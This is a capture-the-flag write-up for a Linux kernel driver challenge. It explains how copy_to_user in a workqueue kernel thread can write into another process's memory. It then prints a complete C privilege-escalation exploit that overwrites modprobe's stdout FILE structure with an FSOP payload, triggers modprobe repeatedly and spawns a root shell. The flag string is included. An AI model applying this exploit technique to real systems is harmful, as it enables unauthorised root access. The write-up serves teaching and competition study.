+</span></span><span style=display:flex><span>    chall_major <span style=color:#f92672>=</span> <span style=color:#a6e22e>register_chrdev</span>(<span style=color:#ae81ff>0</span>, CHALL_DEVICE_NAME, <span style=color:#f92672>&amp;</span>chall_fops);
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (chall_major <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>0</span>) {
+</span></span><span style=display:flex><span>        <span style=color:#a6e22e>printk</span>(KERN_ALERT <span style=color:#e6db74>&#34;chall: Failed to register char device (%d)</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, chall_major);
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> chall_major;
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>printk</span>(KERN_INFO <span style=color:#e6db74>&#34;chall: Registered with major number %d</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, chall_major);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    chall_dev_class <span style=color:#f92672>=</span> <span style=color:#a6e22e>class_create</span>(CHALL_DEVICE_CLASS_NAME);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>IS_ERR</span>(chall_dev_class)) {
+</span></span><span style=display:flex><span>        <span style=color:#a6e22e>unregister_chrdev</span>(chall_major, CHALL_DEVICE_NAME);
+</span></span><span style=display:flex><span>        <span style=color:#a6e22e>printk</span>(KERN_ALERT <span style=color:#e6db74>&#34;chall: Failed to create device class</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#a6e22e>PTR_ERR</span>(chall_dev_class);
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>printk</span>(KERN_INFO <span style=color:#e6db74>&#34;chall: Device class created</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    chall_dev <span style=color:#f92672>=</span> <span style=color:#a6e22e>device_create</span>(chall_dev_class, NULL, <span style=color:#a6e22e>MKDEV</span>(chall_major, <span style=color:#ae81ff>0</span>), NULL, CHALL_DEVICE_NAME);
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>IS_ERR</span>(chall_dev)) {
+</span></span><span style=display:flex><span>        <span style=color:#a6e22e>class_destroy</span>(chall_dev_class);
+</span></span><span style=display:flex><span>        <span style=color:#a6e22e>unregister_chrdev</span>(chall_major, CHALL_DEVICE_NAME);
+</span></span><span style=display:flex><span>        <span style=color:#a6e22e>printk</span>(KERN_ALERT <span style=color:#e6db74>&#34;chall: Failed to create device</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#a6e22e>PTR_ERR</span>(chall_dev);
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>printk</span>(KERN_INFO <span style=color:#e6db74>&#34;chall: Device ready</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> (i <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>; i <span style=color:#f92672>&lt;</span> CHALL_KREQUESTS_MAX_SIZE; <span style=color:#f92672>++</span>i)
+</span></span><span style=display:flex><span>        krequests[i].status <span style=color:#f92672>=</span> REQ_FREE;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> (i <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>; i <span style=color:#f92672>&lt;</span> CHALL_KBUFS_MAX_SIZE; <span style=color:#f92672>++</span>i)
+</span></span><span style=display:flex><span>        kbufs[i].status <span style=color:#f92672>=</span> KBUF_FREE;
+</span></span><span style=display:flex><span>    
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0</span>;
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>static</span> <span style=color:#66d9ef>void</span> __exit <span style=color:#a6e22e>chall_exit</span>(<span style=color:#66d9ef>void</span>)
+</span></span><span style=display:flex><span>{
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>device_destroy</span>(chall_dev_class, <span style=color:#a6e22e>MKDEV</span>(chall_major, <span style=color:#ae81ff>0</span>));
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>class_unregister</span>(chall_dev_class);
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>class_destroy</span>(chall_dev_class);
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>unregister_chrdev</span>(chall_major, CHALL_DEVICE_NAME);
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>printk</span>(KERN_INFO <span style=color:#e6db74>&#34;chall: Driver unloaded</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>static</span> <span style=color:#66d9ef>int</span> <span style=color:#a6e22e>chall_open</span>(<span style=color:#66d9ef>struct</span> inode <span style=color:#f92672>*</span>inodep, <span style=color:#66d9ef>struct</span> file <span style=color:#f92672>*</span>filep)
+</span></span><span style=display:flex><span>{
+</span></span><span style=display:flex><span>    
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>printk</span>(KERN_INFO <span style=color:#e6db74>&#34;chall: Device opened</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0</span>;
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>static</span> <span style=color:#66d9ef>int</span> <span style=color:#a6e22e>chall_release</span>(<span style=color:#66d9ef>struct</span> inode <span style=color:#f92672>*</span>inodep, <span style=color:#66d9ef>struct</span> file <span style=color:#f92672>*</span>filep)
+</span></span><span style=display:flex><span>{   
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>printk</span>(KERN_INFO <span style=color:#e6db74>&#34;chall: Device closed</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0</span>;
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>module_init</span>(chall_init);
+</span></span><span style=display:flex><span><span style=color:#a6e22e>module_exit</span>(chall_exit);
+</span></span></code></pre></div><h2 id=brief-overview-of-the-module>Brief overview of the module</h2><p>The module allows users to read and write, to and from, kernel-space buffers (<code>kbufs</code>). The module then executes krequests to use these buffers asynchronously by using work queues.</p><p>The user can create four types of krequests:</p><ol><li><code>TYPE_READ</code></li><li><code>TYPE_WRITE</code></li><li><code>TYPE_DELETE</code></li><li><code>TYPE_SET_WORK</code></li></ol><p><code>TYPE_READ</code> and <code>TYPE_WRITE</code> are used to asynchronously read from and write to a kernel buffer using a given user-space address.
+<code>TYPE_SET_WORK</code> schedules asynchronous work by specifying the ID of a previously registered request and the delay before execution.</p><h2 id=spotting-the-vulnerability>Spotting the vulnerability</h2><p>The vulnerability is somewhat tricky to find. There are no BOFs, and everything is protected by a single mutex, so there are (allegedly) no race conditions.</p><p>To understand the problem you should ask yourself: &ldquo;What happens if you use copy_{from,to}_user in a kernel thread?&rdquo;</p><p>A kernel thread does not have its own <code>mm</code> (<code>task->mm = NULL</code>). Instead, it runs with an <code>active_mm</code>, i.e., a borrowed user-space memory context. As a result, operations like <code>copy_to_user</code> and <code>copy_from_user</code> may execute in the address space of a different process than the one that originally issued the request.</p><p>This detail is not clearly documented for kernel threads or workqueues, so understanding it usually requires digging into the kernel source.</p><h2 id=exploiting>Exploiting</h2><p>The objective is to overwrite a privileged process&rsquo; memory. A good target could be <code>/sbin/modprobe</code> and, since the challenge uses busybox, this is just a symlink to the busybox binary.
+By default busybox is no-PIE and static, and I have compiled it with symbols too to help players out a bit.
+Now the idea is simple: we can overwrite <code>_IO_2_1_stdout_</code> file struct and use a (simplified) variation of angry FSOP to execute an arbitrary program as root. You obviously can&rsquo;t just execute <code>/bin/sh</code> since when modprobe is running you can&rsquo;t interact with it via standard input and output but you can just execute something like <code>/tmp/e</code> where <code>e</code> is whatever you want.
+Since busybox is static, <code>__dlopen</code> is defined and we can bypass the checks on the address of the file&rsquo;s vtable.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#66d9ef>void</span> attribute_hidden
+</span></span><span style=display:flex><span><span style=color:#a6e22e>_IO_vtable_check</span> (<span style=color:#66d9ef>void</span>)
+</span></span><span style=display:flex><span>{
+</span></span><span style=display:flex><span><span style=color:#75715e>#ifdef SHARED
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#75715e>/* Honor the compatibility flag.  */</span>
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>void</span> (<span style=color:#f92672>*</span>flag) (<span style=color:#66d9ef>void</span>) <span style=color:#f92672>=</span> <span style=color:#a6e22e>atomic_load_relaxed</span> (<span style=color:#f92672>&amp;</span>IO_accept_foreign_vtables);
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>PTR_DEMANGLE</span> (flag);
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> (flag <span style=color:#f92672>==</span> <span style=color:#f92672>&amp;</span>_IO_vtable_check)
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span>;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  <span style=color:#75715e>/* In case this libc copy is in a non-default namespace, we always
+</span></span></span><span style=display:flex><span><span style=color:#75715e>     need to accept foreign vtables because there is always a
+</span></span></span><span style=display:flex><span><span style=color:#75715e>     possibility that FILE * objects are passed across the linking
+</span></span></span><span style=display:flex><span><span style=color:#75715e>     boundary.  */</span>
+</span></span><span style=display:flex><span>  {
+</span></span><span style=display:flex><span>    Dl_info di;
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>struct</span> link_map <span style=color:#f92672>*</span>l;
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span><span style=color:#a6e22e>rtld_active</span> ()
+</span></span><span style=display:flex><span>        <span style=color:#f92672>||</span> (<span style=color:#a6e22e>_dl_addr</span> (_IO_vtable_check, <span style=color:#f92672>&amp;</span>di, <span style=color:#f92672>&amp;</span>l, NULL) <span style=color:#f92672>!=</span> <span style=color:#ae81ff>0</span>
+</span></span><span style=display:flex><span>            <span style=color:#f92672>&amp;&amp;</span> l<span style=color:#f92672>-&gt;</span>l_ns <span style=color:#f92672>!=</span> LM_ID_BASE))
+</span></span><span style=display:flex><span>      <span style=color:#66d9ef>return</span>;
+</span></span><span style=display:flex><span>  }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e>#else </span><span style=color:#75715e>/* !SHARED */</span><span style=color:#75715e>
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#75715e>/* We cannot perform vtable validation in the static dlopen case
+</span></span></span><span style=display:flex><span><span style=color:#75715e>     because FILE * handles might be passed back and forth across the
+</span></span></span><span style=display:flex><span><span style=color:#75715e>     boundary.  Therefore, we disable checking in this case.  */</span>
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> (__dlopen <span style=color:#f92672>!=</span> NULL)
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span>;
+</span></span><span style=display:flex><span><span style=color:#75715e>#endif
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>__libc_fatal</span> (<span style=color:#e6db74>&#34;Fatal error: glibc detected an invalid stdio handle</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>So the steps are:</p><ol><li>Setup <code>/tmp/e</code> with the bash commands that we want to execute as root</li><li>Submit and execute a lot of write requests to fill all kernel buffers with our FSOP payload</li><li>Submit a lot of read requests and pass the address of <code>_IO_2_1_stdout_</code> as target user space address</li><li>Set all the works with a bit of delay so that the requests do not get processed immediately</li><li>Spam <code>modprobe</code> and hope that right before the krequests get processed the CPU executes <code>modprobe</code></li><li>Execute <code>system("/tmp/e")</code></li></ol><h2 id=flag>Flag</h2><p><code>TRX{0h_s0_y0u_d0_und3rst4nd_h0w_kthr34ds_w0rk!_cd454889c85c415b}</code></p><h2 id=exploit>Exploit</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&#34;helpers.h&#34;</span><span style=color:#75715e>
+</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;string.h&gt;</span><span style=color:#75715e>
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
+</span></span><span style=display:flex><span><span style=color:#75715e>#define IOCTL_CHALL_MAGIC               &#39;E&#39;
+</span></span></span><span style=display:flex><span><span style=color:#75715e>#define IOCTL_CHALL_ADD_REQUEST         _IOW(IOCTL_CHALL_MAGIC, 0, struct urequest *)
+</span></span></span><span style=display:flex><span><span style=color:#75715e>#define IOCTL_CHALL_SET_WORK            _IOW(IOCTL_CHALL_MAGIC, 3, struct urequest *)
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
+</span></span><span style=display:flex><span><span style=color:#75715e>#define DEV &#34;/dev/chall&#34;
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
+</span></span><span style=display:flex><span><span style=color:#75715e>#define CHALL_KBUF_SIZE                 0x0400
+</span></span></span><span style=display:flex><span><span style=color:#75715e>#define CHALL_KBUFS_SIZE                0x0050
+</span></span></span><span style=display:flex><span><span style=color:#75715e>#define CHALL_KREQUESTS_MAX_SIZE        0x0020
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
+</span></span><span style=display:flex><span><span style=color:#75715e>#define STDOUT_ADDRESS                  0x657440
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e>/* Driver structs &amp; enums */</span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>enum</span> krequest_type {
+</span></span><span style=display:flex><span>    TYPE_READ,      
+</span></span><span style=display:flex><span>    TYPE_WRITE,
+</span></span><span style=display:flex><span>    TYPE_DELETE,
+</span></span><span style=display:flex><span>    TYPE_SET_WORK       
+</span></span><span style=display:flex><span>};
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>enum</span> krequest_status {
+</span></span><span style=display:flex><span>    REQ_PENDING,
+</span></span><span style=display:flex><span>    REQ_FREE
+</span></span><span style=display:flex><span>};
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>union</span> request_info {
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>struct</span> {
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>size_t</span> size;
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>char</span><span style=color:#f92672>*</span> ubuf;
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>size_t</span> kbuf_idx;
+</span></span><span style=display:flex><span>    } rw;
+</span></span><span style=display:flex><span>        
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>struct</span> {
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>size_t</span> kbuf_idx;
+</span></span><span style=display:flex><span>    } delete;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>struct</span> {
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>size_t</span> kreq_idx;
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>long</span> time;
+</span></span><span style=display:flex><span>    } work;
+</span></span><span style=display:flex><span>};
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>struct</span> urequest {
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>enum</span> krequest_type type;
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>union</span> request_info info;
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>size_t</span> req_idx;
+</span></span><span style=display:flex><span>};
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>__attribute__</span>((constructor))
+</span></span><span style=display:flex><span><span style=color:#66d9ef>void</span> <span style=color:#a6e22e>init</span>(){
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>setbuf</span>(stdout, NULL);
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>setbuf</span>(stdin, NULL);
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>setbuf</span>(stderr, NULL);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>system</span>(<span style=color:#e6db74>&#34;rm -f /tmp/e&#34;</span>);
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>system</span>(<span style=color:#e6db74>&#34;echo -ne &#39;#!/bin/sh</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>cat /dev/sda &gt; /tmp/flag.txt</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#39; &gt; /tmp/e&#34;</span>);
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>system</span>(<span style=color:#e6db74>&#34;chmod +x /tmp/e&#34;</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>getuid</span>() <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span>)
+</span></span><span style=display:flex><span>        <span style=color:#a6e22e>system</span>(<span style=color:#e6db74>&#34;/bin/sh&#34;</span>);
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>int</span> <span style=color:#a6e22e>main</span>(){
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>int</span> dev;
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>long</span> fsop_payload[] <span style=color:#f92672>=</span> {<span style=color:#f92672>*</span>(<span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>long</span> <span style=color:#f92672>*</span>)<span style=color:#e6db74>&#34;/tmp/e</span><span style=color:#ae81ff>\0</span><span style=color:#e6db74>&#34;</span>, <span style=color:#ae81ff>6648880ul</span>, <span style=color:#ae81ff>6648880ul</span>, <span style=color:#ae81ff>6648880ul</span>, <span style=color:#ae81ff>6648880ul</span>, <span style=color:#ae81ff>6648880ul</span>, <span style=color:#ae81ff>6648880ul</span>, <span style=color:#ae81ff>6648880ul</span>, <span style=color:#ae81ff>6648880ul</span>, <span style=color:#ae81ff>0ul</span>, <span style=color:#ae81ff>0ul</span>, <span style=color:#ae81ff>0ul</span>, <span style=color:#ae81ff>0ul</span>, <span style=color:#ae81ff>6649376ul</span>, <span style=color:#ae81ff>1ul</span>, <span style=color:#ae81ff>18446744073709551615ul</span>, <span style=color:#ae81ff>0ul</span>, <span style=color:#ae81ff>6681808ul</span>, <span style=color:#ae81ff>18446744073709551615ul</span>, <span style=color:#ae81ff>0ul</span>, <span style=color:#ae81ff>6649120ul</span>, <span style=color:#ae81ff>0ul</span>, <span style=color:#ae81ff>0ul</span>, <span style=color:#ae81ff>0ul</span>, <span style=color:#ae81ff>4294967295ul</span>, <span style=color:#ae81ff>0ul</span>, <span style=color:#ae81ff>0ul</span>, <span style=color:#ae81ff>6649120ul</span>, <span style=color:#ae81ff>4347264ul</span>, <span style=color:#ae81ff>4347264ul</span>, <span style=color:#ae81ff>4347264ul</span>, <span style=color:#ae81ff>4347264ul</span>, <span style=color:#ae81ff>4347264ul</span>, <span style=color:#ae81ff>4347264ul</span>, <span style=color:#ae81ff>4347264ul</span>, <span style=color:#ae81ff>4347264ul</span>, <span style=color:#ae81ff>4347264ul</span>, <span style=color:#ae81ff>4347264ul</span>, <span style=color:#ae81ff>4347264ul</span>, <span style=color:#ae81ff>4347264ul</span>, <span style=color:#ae81ff>4347264ul</span>, <span style=color:#ae81ff>4347264ul</span>, <span style=color:#ae81ff>4347264ul</span>, <span style=color:#ae81ff>4347264ul</span>, <span style=color:#ae81ff>4347264ul</span>, <span style=color:#ae81ff>4347264ul</span>, <span style=color:#ae81ff>4347264ul</span>, <span style=color:#ae81ff>4347264ul</span>, <span style=color:#ae81ff>4347264ul</span>, <span style=color:#ae81ff>4347264ul</span>, <span style=color:#ae81ff>4347264ul</span>, <span style=color:#ae81ff>4347264ul</span>, <span style=color:#ae81ff>4347264ul</span>, <span style=color:#ae81ff>4347264ul</span>, <span style=color:#ae81ff>4347264ul</span>, <span style=color:#ae81ff>4347264ul</span>, <span style=color:#ae81ff>4347264ul</span>, <span style=color:#ae81ff>4347264ul</span>, <span style=color:#ae81ff>4347264ul</span>, <span style=color:#ae81ff>4347264ul</span>};
+</span></span><span style=display:flex><span>    fsop_payload[<span style=color:#ae81ff>5</span>] <span style=color:#f92672>+=</span> <span style=color:#ae81ff>1</span>; <span style=color:#75715e>// look at _IO_flush_all to understand why we need this lmao
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>char</span><span style=color:#f92672>*</span> tmp_buf <span style=color:#f92672>=</span> (<span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>)STDOUT_ADDRESS;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>hlt</span>(<span style=color:#e6db74>&#34;start exploit&#34;</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    dev <span style=color:#f92672>=</span> <span style=color:#a6e22e>open</span>(DEV, O_RDWR);
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span>(dev <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>0</span>)
+</span></span><span style=display:flex><span>        <span style=color:#a6e22e>err</span>(<span style=color:#ae81ff>1</span>, <span style=color:#e6db74>&#34;could not open device&#34;</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#75715e>// prepare write request
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#66d9ef>struct</span> urequest rureq <span style=color:#f92672>=</span> {
+</span></span><span style=display:flex><span>        .type <span style=color:#f92672>=</span> TYPE_WRITE,
+</span></span><span style=display:flex><span>        .info <span style=color:#f92672>=</span> {
+</span></span><span style=display:flex><span>            .rw <span style=color:#f92672>=</span> {
+</span></span><span style=display:flex><span>                .kbuf_idx <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>,
+</span></span><span style=display:flex><span>                .size <span style=color:#f92672>=</span> <span style=color:#66d9ef>sizeof</span>(fsop_payload) <span style=color:#f92672>*</span> <span style=color:#66d9ef>sizeof</span>(<span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>long</span>),
+</span></span><span style=display:flex><span>                .ubuf <span style=color:#f92672>=</span> (<span style=color:#66d9ef>void</span> <span style=color:#f92672>*</span>)fsop_payload
+</span></span><span style=display:flex><span>            }
+</span></span><span style=display:flex><span>        }
+</span></span><span style=display:flex><span>    };
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>ioctl</span>(dev, IOCTL_CHALL_ADD_REQUEST, <span style=color:#f92672>&amp;</span>rureq) <span style=color:#f92672>!=</span> <span style=color:#ae81ff>0</span>)
+</span></span><span style=display:flex><span>        <span style=color:#a6e22e>err</span>(<span style=color:#ae81ff>1</span>, <span style=color:#e6db74>&#34;ioctl failed&#34;</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#75715e>// start countdown
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    rureq.type <span style=color:#f92672>=</span> TYPE_SET_WORK;
+</span></span><span style=display:flex><span>    rureq.info.work.kreq_idx <span style=color:#f92672>=</span> rureq.req_idx;
+</span></span><span style=display:flex><span>    rureq.info.work.time <span style=color:#f92672>=</span> <span style=color:#ae81ff>1000</span>; <span style=color:#75715e>// ns
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>ioctl</span>(dev, IOCTL_CHALL_SET_WORK, <span style=color:#f92672>&amp;</span>rureq) <span style=color:#f92672>!=</span> <span style=color:#ae81ff>0</span>)
+</span></span><span style=display:flex><span>        <span style=color:#a6e22e>err</span>(<span style=color:#ae81ff>1</span>, <span style=color:#e6db74>&#34;ioctl failed&#34;</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>sleep</span>(<span style=color:#ae81ff>1</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span>(<span style=color:#66d9ef>int</span> i <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>; i <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>0x20</span><span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>; <span style=color:#f92672>++</span>i){
+</span></span><span style=display:flex><span>        <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;.&#34;</span>);
+</span></span><span style=display:flex><span>        <span style=color:#75715e>// prepare read request
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#66d9ef>struct</span> urequest wureq <span style=color:#f92672>=</span> {
+</span></span><span style=display:flex><span>            .type <span style=color:#f92672>=</span> TYPE_READ,
+</span></span><span style=display:flex><span>            .info <span style=color:#f92672>=</span> {
+</span></span><span style=display:flex><span>                .rw <span style=color:#f92672>=</span> {
+</span></span><span style=display:flex><span>                    .kbuf_idx <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>,
+</span></span><span style=display:flex><span>                    .size <span style=color:#f92672>=</span> PAGE_SIZE,
+</span></span><span style=display:flex><span>                    .ubuf <span style=color:#f92672>=</span> tmp_buf
+</span></span><span style=display:flex><span>                }
+</span></span><span style=display:flex><span>            }
+</span></span><span style=display:flex><span>        };
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>ioctl</span>(dev, IOCTL_CHALL_ADD_REQUEST, <span style=color:#f92672>&amp;</span>wureq) <span style=color:#f92672>!=</span> <span style=color:#ae81ff>0</span>)
+</span></span><span style=display:flex><span>            <span style=color:#a6e22e>err</span>(<span style=color:#ae81ff>1</span>, <span style=color:#e6db74>&#34;ioctl failed&#34;</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        <span style=color:#75715e>// start countdown
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        wureq.type <span style=color:#f92672>=</span> TYPE_SET_WORK;
+</span></span><span style=display:flex><span>        wureq.info.work.kreq_idx <span style=color:#f92672>=</span> wureq.req_idx;
+</span></span><span style=display:flex><span>        wureq.info.work.time <span style=color:#f92672>=</span> <span style=color:#ae81ff>1000</span><span style=color:#f92672>+</span>i<span style=color:#f92672>*</span><span style=color:#ae81ff>10</span>; <span style=color:#75715e>// ns
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>ioctl</span>(dev, IOCTL_CHALL_SET_WORK, <span style=color:#f92672>&amp;</span>wureq) <span style=color:#f92672>!=</span> <span style=color:#ae81ff>0</span>)
+</span></span><span style=display:flex><span>            <span style=color:#a6e22e>err</span>(<span style=color:#ae81ff>1</span>, <span style=color:#e6db74>&#34;ioctl failed&#34;</span>);
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>puts</span>(INF <span style=color:#e6db74>&#34;starting modprobe trigger&#34;</span>);    
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>fork</span>() <span style=color:#f92672>!=</span> <span style=color:#ae81ff>0</span>){
+</span></span><span style=display:flex><span>        <span style=color:#a6e22e>sleep</span>(<span style=color:#ae81ff>5</span>);
+</span></span><span style=display:flex><span>        <span style=color:#a6e22e>puts</span>(<span style=color:#e6db74>&#34;spawning shell&#34;</span>);
+</span></span><span style=display:flex><span>        <span style=color:#a6e22e>system</span>(<span style=color:#e6db74>&#34;/bin/sh&#34;</span>);
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>else</span>{
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>for</span>(;;) <span style=color:#a6e22e>socket</span>(<span style=color:#ae81ff>22</span>, SOCK_DGRAM, <span style=color:#ae81ff>0</span>);
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>close</span>(dev);
